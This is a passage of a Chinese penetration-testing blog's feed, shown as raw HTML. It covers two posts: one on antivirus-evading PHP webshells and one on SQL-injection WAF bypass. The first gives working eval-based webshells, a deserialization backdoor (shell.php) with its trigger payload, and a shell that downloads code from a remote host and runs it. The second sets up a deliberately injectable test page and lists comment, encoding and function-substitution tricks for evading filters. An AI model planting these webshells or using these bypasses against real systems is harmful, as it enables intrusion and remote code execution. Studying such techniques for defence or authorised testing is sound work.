class="line">$c = &amp;$b;</span><br><span class="line"><span class="keyword">eval</span>($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可变变量</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$do = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$$do = $_POST[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">eval</span>($$do);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用短标签"><a href="#使用短标签" class="headerlink" title="使用短标签"></a>使用短标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用短标签，short_open_tag = On </span></span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态执行"><a href="#动态执行" class="headerlink" title="动态执行"></a>动态执行</h2><p>webshell中不写执行函数，函数是通过传递参数来实现的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_POST[&#39;hanshu&#39;]($_GET[&#39;canshu&#39;]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();  <span class="comment">// 生成a对象</span></span><br><span class="line">$b = serialize($a);  <span class="comment">// 序列化a对象为b</span></span><br><span class="line">$c = unserialize($b); <span class="comment">// 反序列化b对象为c</span></span><br><span class="line"></span><br><span class="line">print_r($b);   <span class="comment">// 输出序列化之后的值:O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:4:&quot;demo&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">print_r($c-&gt;test);  <span class="comment">// 输出对象c中test的值:demo</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造反序列化马–<code>shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data=<span class="string">&quot;text&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file_name=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">unserialize($file_name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写好析构函数后，我们需要构造自己的序列化数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?id=id=O:<span class="number">3</span>:<span class="string">&quot;foo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="不使用关键字"><a href="#不使用关键字" class="headerlink" title="不使用关键字"></a>不使用关键字</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = file_get_contents(<span class="string">&quot;http://xxx.xxx.xxx.xxx/xxx.txt&quot;</span>);</span><br><span class="line">$str($_REQUEST[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试–免杀总结&quot;&gt;&lt;a href=&quot;#渗透测试–免杀总结&quot; class=&quot;headerlink&quot; title=&quot;渗透测试–免杀总结&quot;&gt;&lt;/a&gt;渗透测试–免杀总结&lt;/h1&gt;&lt;h2 id=&quot;字符串&quot;&gt;&lt;a href=&quot;#字符串&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--waf绕过</title>
    <link href="http://s1eady.top/2020/11/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--waf%E7%BB%95%E8%BF%87/"/>
    <id>http://s1eady.top/2020/11/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--waf%E7%BB%95%E8%BF%87/</id>
    <published>2020-11-29T02:08:12.000Z</published>
    <updated>2020-12-01T01:19:57.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试–waf绕过"><a href="#渗透测试–waf绕过" class="headerlink" title="渗透测试–waf绕过"></a>渗透测试–waf绕过</h1><h2 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h2><h3 id="waf简介"><a href="#waf简介" class="headerlink" title="waf简介"></a>waf简介</h3><p>Web应用防火墙，主要的目的实际上是用来过滤不正常或者恶意请求包，以及为服务器打上临时补丁的作用。</p><h3 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h3><h4 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h4><p>在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求uri时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。常见产品：阿里云防护，腾讯云防护，创宇云之类等。</p><h4 id="主机防护软件"><a href="#主机防护软件" class="headerlink" title="主机防护软件"></a>主机防护软件</h4><p>在目标机器上装waf软件，比如安全狗、g01、云锁、D盾等。</p><h4 id="硬WAF"><a href="#硬WAF" class="headerlink" title="硬WAF"></a>硬WAF</h4><p>硬件waf，需要购买某些厂商的设备，一般会对进来的流量<code>对数据包进行拆包-&gt;清洗-&gt;规则命中-&gt;放行/丢弃</code>。</p><h4 id="自定义WAF"><a href="#自定义WAF" class="headerlink" title="自定义WAF"></a>自定义WAF</h4><p>程序员自己通过代码来过滤，目标的恶意输入。</p><p>在平时渗透测试的时候，waf一般分为代码waf以及流量waf，代码waf多是对某一个参数值进行过滤检测，流量waf多是对数据包进行检测。</p><h2 id="Sql注入过WAF"><a href="#Sql注入过WAF" class="headerlink" title="Sql注入过WAF"></a>Sql注入过WAF</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>Conn.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//(1)数据库配置信息</span></span><br><span class="line">$db_host = <span class="string">&quot;localhost&quot;</span>;<span class="comment">//主机名  localhost:3306</span></span><br><span class="line">$db_port = <span class="string">&quot;3306&quot;</span>;<span class="comment">//端口号</span></span><br><span class="line">$db_user = <span class="string">&quot;root&quot;</span>;<span class="comment">//用户名</span></span><br><span class="line">$db_pass = <span class="string">&quot;root&quot;</span>;<span class="comment">//密码</span></span><br><span class="line">$db_name = <span class="string">&quot;test&quot;</span>;<span class="comment">//数据库名</span></span><br><span class="line">$charset = <span class="string">&quot;utf8&quot;</span>;<span class="comment">//字符集</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(2)PHP连接MySQL服务器</span></span><br><span class="line"><span class="keyword">if</span>(!$link = @mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port,$db_user,$db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;PHP连接MySQL服务器失败！&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;系统错误信息：&quot;</span>.mysqli_connect_error();</span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">//中止程序向下运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(3)选择当前数据库</span></span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db($link,$db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;选择数据库<span class="subst">&#123;$db_name&#125;</span>失败！&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(4)设置数据库返回数据字符集</span></span><br><span class="line">mysqli_set_charset($link,$charset);</span><br></pre></td></tr></table></figure><p>listt.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"><span class="comment">//执行查询的SQL语句</span></span><br><span class="line">$sql = $_GET[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line">$result = mysqli_query($link,$sql);</span><br><span class="line"><span class="comment">//获取所有行数据</span></span><br><span class="line">$arrs = mysqli_fetch_all($result,MYSQLI_ASSOC);</span><br><span class="line"><span class="comment">//获取学生人数</span></span><br><span class="line">var_dump($arrs);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>数据库监控工具使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tangxiaofeng7&#x2F;MysqlMonitor-GUI</span><br></pre></td></tr></table></figure><h3 id="注释绕过–内联注释与多行注释"><a href="#注释绕过–内联注释与多行注释" class="headerlink" title="注释绕过–内联注释与多行注释"></a>注释绕过–内联注释与多行注释</h3><p><code>/**/</code>：多行注释</p><p><code>/*！*/</code>：内联注释</p><p><code>/* */</code>注释符号在mysql数据库中是多行注释的作用，例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="comment">/*and */</span><span class="keyword">from</span> math where id=<span class="number">1</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>在注释符号<code>/**/</code>中的语句是不会执行的，但是如果我们想让注视符号中的语句执行可以使用：<code>/*!*/</code>。</p><p><code>/*!xxx*/</code>是mysql数据库对<code>/**/</code>符号功能的一种扩展，如果在<code>/* */</code>注释符号内最前面添加了感叹号的话，那么多行注释符号里的内容将会执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where <span class="comment">/*!id=1*/</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> math where <span class="comment">/*id=1*/</span>;</span><br><span class="line"><span class="built_in">ERROR</span> <span class="number">1064</span> (<span class="number">42000</span>): You have an <span class="built_in">error</span> in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br></pre></td></tr></table></figure><h3 id="内联注释-数字"><a href="#内联注释-数字" class="headerlink" title="内联注释+数字"></a>内联注释+数字</h3><p>在上面的内联注入中<code>/*！*/</code>，如果加上数字，比如：<code>/*！50005*/</code>、<code>/*！70007*/</code>，也可以成功执行，数字50000表示：数据库在执行之前会先判断当前数据库的版本，如果当前数据库的版本是在5.00.05以上的话，注释符号里的内容会被当做SQL指令执行，70007同理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where <span class="comment">/*!50005id=1*/</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> math where <span class="comment">/*!70007id=1*/</span>;</span><br><span class="line"><span class="built_in">ERROR</span> <span class="number">1064</span> (<span class="number">42000</span>): You have an <span class="built_in">error</span> in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br></pre></td></tr></table></figure><h3 id="注释绕过总结"><a href="#注释绕过总结" class="headerlink" title="注释绕过总结"></a>注释绕过总结</h3><ul><li><p>多行注释、内联注释可以替换空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="comment">/**/</span>math<span class="comment">/**/</span>where<span class="comment">/**/</span>id=<span class="number">1</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="comment">/**/</span>math<span class="comment">/*！*/</span>where<span class="comment">/*！*/</span>id=<span class="number">1</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>内联注释可以绕过关键字的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math <span class="comment">/*!where*/</span> id=<span class="number">1</span>;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | 李明      |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | gongxinao |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="number">444</span>       |</span><br><span class="line">|    <span class="number">1</span> | <span class="literal">NULL</span>      |</span><br><span class="line">+------+-----------+</span><br><span class="line"><span class="number">7</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><h3 id="等价绕过"><a href="#等价绕过" class="headerlink" title="等价绕过"></a>等价绕过</h3><h4 id="空格替换"><a href="#空格替换" class="headerlink" title="空格替换"></a>空格替换</h4><h5 id="空白字符–unicode编码"><a href="#空白字符–unicode编码" class="headerlink" title="空白字符–unicode编码"></a>空白字符–unicode编码</h5><p><code>%09,%0a,%0b,%0c,%0d,%20,%a0</code></p><table><thead><tr><th>Urlencode</th><th>Urldecode</th></tr></thead><tbody><tr><td>%0A</td><td>\n</td></tr><tr><td>%23</td><td>#</td></tr><tr><td>%2d</td><td>-</td></tr><tr><td>%0B</td><td>vertical tab</td></tr><tr><td>%0C</td><td>new page</td></tr><tr><td>%0D</td><td>carriage return</td></tr><tr><td>%A0</td><td>non-breaking space</td></tr><tr><td>%20</td><td>Space</td></tr><tr><td>%09</td><td>Horizontal Tab</td></tr><tr><td>%26</td><td>&amp;(and)</td></tr></tbody></table><p><code>%09,%0a,%0b</code>对应执行的sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">00</span>:<span class="number">12</span>:<span class="number">14</span>] select*<span class="keyword">from</span>math</span><br><span class="line">[<span class="number">00</span>:<span class="number">15</span>:<span class="number">12</span>] select</span><br><span class="line">*</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">math</span><br><span class="line">[<span class="number">00</span>:<span class="number">15</span>:<span class="number">38</span>] select*frommath</span><br></pre></td></tr></table></figure><h5 id="–url解码为空格"><a href="#–url解码为空格" class="headerlink" title="+–url解码为空格"></a>+–url解码为空格</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;listt.php?sql&#x3D;select+id+from+math</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[12:51:42] select id from math</span><br></pre></td></tr></table></figure><h4 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h4><p>waf可能仅仅针对某一个函数限制，在数据库中有许多等价的函数，可以代替被限制的函数，通常使用偏僻不常用的函数。</p><h5 id="mysql常见函数"><a href="#mysql常见函数" class="headerlink" title="mysql常见函数"></a>mysql常见函数</h5><h6 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br></pre></td></tr></table></figure><h6 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br></pre></td></tr></table></figure><h6 id="字符转换"><a href="#字符转换" class="headerlink" title="字符转换"></a>字符转换</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">Ascii(&#39;a&#39;)</span><br><span class="line">abs(111)&#x2F;&#x2F;返回数字的绝对值。</span><br><span class="line">bin()</span><br></pre></td></tr></table></figure><h4 id="逗号替换"><a href="#逗号替换" class="headerlink" title="逗号替换"></a>逗号替换</h4><h6 id="limit处的逗号"><a href="#limit处的逗号" class="headerlink" title="limit处的逗号"></a>limit处的逗号</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0</span><br></pre></td></tr></table></figure><h6 id="字符串截取处的逗号"><a href="#字符串截取处的逗号" class="headerlink" title="字符串截取处的逗号"></a>字符串截取处的逗号</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(version() from 1 for 1)</span><br></pre></td></tr></table></figure><h6 id="联合查询逗号绕过"><a href="#联合查询逗号绕过" class="headerlink" title="联合查询逗号绕过"></a>联合查询逗号绕过</h6><p>Join-从多个数据表中读取数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | <span class="number">4</span> |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | <span class="number">4</span> |</span><br><span class="line">+---+---+---+---+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> ((select <span class="number">1</span>)A join (select <span class="number">2</span>)B join (select <span class="number">3</span>)C join (select <span class="number">4</span>)D);</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | <span class="number">4</span> |</span><br><span class="line">+---+---+---+---+</span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | <span class="number">4</span> |</span><br><span class="line">+---+---+---+---+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> ((select <span class="number">1</span>)A join (select <span class="number">2</span>)B join (select <span class="number">3</span>)C join (select user())D);</span><br><span class="line">+---+---+---+----------------+</span><br><span class="line">| <span class="number">1</span> | <span class="number">2</span> | <span class="number">3</span> | user()         |</span><br><span class="line">+---+---+---+----------------+</span><br><span class="line">| <span 